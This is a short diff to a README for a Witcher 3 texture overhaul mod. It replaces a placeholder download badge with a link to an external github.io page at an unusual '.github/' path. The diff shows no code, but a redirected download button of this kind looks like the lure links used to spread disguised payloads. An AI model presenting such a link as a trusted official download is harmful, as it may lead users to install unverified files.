@@ -6,7 +6,7 @@ HD Reworked Project is a texture and model overhaul for **The Witcher 3: Wild Hu
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://hd-reworked-project-download.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
